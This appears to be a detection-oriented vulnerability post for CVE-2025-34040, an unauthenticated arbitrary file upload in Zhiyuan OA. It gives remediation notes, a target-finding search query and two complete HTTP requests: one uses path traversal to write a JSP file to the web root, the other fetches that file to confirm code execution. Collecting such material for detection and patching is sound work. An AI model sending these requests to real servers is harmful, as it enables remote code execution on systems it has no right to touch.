---
layout: post
cve_id: CVE-2025-34040
title: Zhiyuan OA Platform - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2025/CVE-2025-34040.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-34040.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,pdresearch
severity: critical
impact: 'Unauthenticated attackers can upload malicious JSP files through path traversal
  in the wpsAssistServlet interface, achieving remote code execution on the Zhiyuan
  OA server.

  '
remediation: 'Upgrade to Zhiyuan OA platform version 8.0sp3 or later that properly
  validates file upload paths and file types.

  '
reference:
- https://www.cve.org/CVERecord?id=CVE-2025-34040
- https://www.cnblogs.com/pursue-security/p/17677130.html
classification:
  epss-score: 0.06587
  epss-percentile: 0.90878
metadata:
  verified: true
  max-request: 1
  fofa-query: body="seeyon/index.jsp"
tags:
- cve
- cve2025
- file-upload
- intrusive
- zhiyuan
- lfi
- vkev
- vuln
---

## üîç Vulnerability Description
An arbitrary file upload vulnerability exists in the Zhiyuan OA platform 5.0, 5.1 - 5.6sp1, 6.0 - 6.1sp2, 7.0, 7.0sp1 - 7.1, 7.1sp1, and 8.0 - 8.0sp2 via the wpsAssistServlet interface. The realFileType and fileId parameters are improperly validated during multipart file uploads, allowing unauthenticated attackers to upload crafted JSP files outside of intended directories using path traversal. Successful exploitation enables remote code execution as the uploaded file can be accessed and executed through the web server.


## üåê HTTP Request
```nohighlight
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/YZguBfut.jsp&fileId=2 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Content-Length: 292
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="upload"; filename="123.xls"
Content-Type: application/vnd.ms-excel
<%@ page import="java.util.Base64" %><%= new String(Base64.getDecoder().decode("bWFsaWNpb3Vz"), "UTF-8") %>
--59229605f98b8cf290a7b8908b34616b--
```

```nohighlight
GET /YZguBfut.jsp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

